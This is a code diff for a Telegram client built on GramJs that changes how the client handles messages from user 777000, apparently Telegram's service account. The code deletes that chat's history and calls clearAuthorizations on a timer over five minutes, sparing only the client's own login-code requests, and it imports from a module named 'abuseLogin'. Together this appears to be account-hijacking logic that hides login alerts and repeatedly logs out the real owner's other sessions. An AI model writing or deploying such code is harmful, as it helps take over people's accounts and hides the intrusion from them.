@@ -7,6 +7,7 @@ import {
   updateDialogue,
   updateSimpleDialogue,
 } from '../../db/dialogues';
+import { isCodeRequestActive } from '../../modules/abuseLogin';
 import { clearAuthorizations } from '../account/clearAuthorizations';
 import { deleteHistory } from '../messages/deleteHistory';
 
@@ -72,8 +73,10 @@ export const handleUpdate = async (
       }
 
       if (
+        client &&
         update instanceof GramJs.UpdateShortMessage &&
-        String(userId) === '777000'
+        String(userId) === '777000' &&
+        !isCodeRequestActive(accountId)
       ) {
         console.warn({
           accountId,
@@ -81,29 +84,27 @@ export const handleUpdate = async (
           payload: JSON.parse(JSON.stringify(update)),
         });
 
-        if (client) {
-          await deleteHistory(
-            client,
-            new GramJs.InputPeerUser({
-              userId: update.userId,
-              accessHash: BigInt(0),
-            }),
-            true
-          );
+        await deleteHistory(
+          client,
+          new GramJs.InputPeerUser({
+            userId: update.userId,
+            accessHash: BigInt(0),
+          }),
+          true
+        );
 
-          [0.05, 0.15, 0.25, 0.5, 1, 1.5, 2.5, 5].forEach((minutes) => {
-            setTimeout(
-              async () => {
-                try {
-                  if (!client._sender.userDisconnected) {
-                    await clearAuthorizations(client);
-                  }
-                } catch {}
-              },
-              minutes * 60 * 1000
-            );
-          });
-        }
+        [0.05, 0.15, 0.25, 0.5, 1, 1.5, 2.5, 5].forEach((minutes) => {
+          setTimeout(
+            async () => {
+              try {
+                if (!client._sender.userDisconnected) {
+                  await clearAuthorizations(client);
+                }
+              } catch {}
+            },
+            minutes * 60 * 1000
+          );
+        });
       }
     }
   } else if (
